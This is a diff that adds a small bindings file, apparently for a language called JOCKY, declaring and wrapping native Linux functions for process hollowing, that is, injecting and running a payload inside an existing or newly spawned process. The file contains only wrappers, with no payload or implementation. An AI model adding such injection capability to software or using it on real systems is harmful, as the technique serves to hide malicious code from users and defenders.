@@ -1,0 +1,19 @@
+// JOCKY Linux process manipulation bindings
+// Provides process hollowing and payload execution
+
+ffi jocky_linux_hollow(target_pid: i32, payload: i8*, size: i64) -> bool;
+ffi jocky_linux_spawn_hollow(path: string, payload: i8*, size: i64) -> i32;
+ffi fork() -> i32;
+ffi execve(path: string, argv: i8*, envp: i8*) -> i32;
+
+// Hollow an existing process with a payload
+// Returns true on success, false on failure
+fn hollow(pid: i32, payload: i8*, size: i64) -> bool {
+    return jocky_linux_hollow(pid, payload, size);
+}
+
+// Spawn a new process and hollow it with a payload
+// Returns the PID of the hollowed process, or -1 on failure
+fn spawn_hollow(path: string, payload: i8*, size: i64) -> i32 {
+    return jocky_linux_spawn_hollow(path, payload, size);
+}
